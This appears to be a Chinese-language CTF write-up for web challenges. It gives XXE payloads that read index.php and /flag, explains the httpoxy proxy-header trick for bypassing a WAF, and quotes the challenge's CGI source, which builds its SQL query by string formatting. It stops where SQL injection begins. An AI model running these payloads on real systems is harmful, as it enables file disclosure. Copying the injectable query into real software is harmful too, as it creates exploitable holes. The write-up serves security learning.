# File Access
```
file://index.php
```

# XXE

讀取index.php檔案，發現 flag 不在裡面=3=
```
<!DOCTYPE root [
  <!ENTITY name SYSTEM
  "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php"
  >
]>
<root>
    <result>&name;</result>
</root>
```
   
然後重讀題目發現....我眼殘 flag 在 /flag

```
<!DOCTYPE root [
  <!ENTITY name SYSTEM "file:///flag">
]>
<root>&name;</root>
```

# Bonus-httpoxy.py
這題一定要有 Proxy Server 而且要給外部訪問，可以利用手機網路，至少有實體IP   
不然AWS 或是其他 VPS 花下去，這題我把Linode 拿來用了...   

遇到一件事就是 Squid 架不起來，Google 了一下，放棄除錯改用 tinyproxy   

這題模擬 cgi 的漏洞，程式到 `http://127.0.0.1/waf` 去判斷參數有沒有正確，這邊就有點問題了     
其中 cgi 會把 header 的值變大寫並在前加入 `HTTP_` 的prefix，並加入環境變數      
而 `HTTP_PROXY` 這環境變數存在則會通過該變數的代理伺服器       
所以在發送請求時加入 proxy 這個 header 就是這題目的主要方法      

## cgi-bin
```
#!/usr/bin/env python
#
# By Orange Tsai :P
#

import os
import cgi
import sqlite3
import requests
from urllib import quote
from base64 import b64encode

print "Content-Type: text/html\n"

query  = os.environ["QUERY_STRING"]
params = dict(cgi.parse_qsl(query))

WAF = 'http://127.0.0.1/waf/'

def check_param(s):
    data = {
        'data': s
    }
    r = requests.post(WAF, data)
    content = r.content.strip()
    if r.content == 'ok':
        return True
    else:
        return False



news_id = params.get('id', '1')
if not check_param(news_id):
	news_id = '1'

conn = sqlite3.connect('/var/www/db/flag.db')
cur = conn.cursor()
cur.execute("SELECT * FROM news WHERE id='%s'" % news_id)
data = cur.fetchone()
if data:
	print data[1]
else:
	print 'Hacker?'
```
## waf
```
<?php
	// Simple Web Application Firewall
	// 
	$data = $_POST['data'];
	$data = (String)$data;
	if ($data == '1' || $data == '2' || $data == '3') {
		echo 'ok';
	}
```


**然後就是SQL injection的開始**   

其實一開始用還用 id 遞增的方式下去跑 XDD   

